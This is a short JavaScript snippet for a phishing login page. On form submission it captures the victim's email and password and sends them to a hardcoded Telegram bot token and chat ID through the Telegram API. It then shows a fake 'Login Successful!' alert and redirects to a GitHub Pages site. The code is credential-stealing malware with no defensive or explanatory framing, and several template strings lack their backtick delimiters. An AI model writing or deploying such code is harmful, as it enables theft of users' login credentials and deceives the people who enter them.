document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let telegramBotToken = "7934135059:AAFwaqZhu4VXerCCMQJSfb7tsn-9oyk01oU"; // 
    let chatId = "6721678542"; // 

    let message = 🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password};
    let telegramURL = https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

    fetch(telegramURL, { method: "GET" })
        .then(response => {
            alert("Login Successful!");
            window.location.href = "https://rh0099.github.io/MA-website2/"; // 
        })
        .catch(error => alert("Error logging in!"));
});
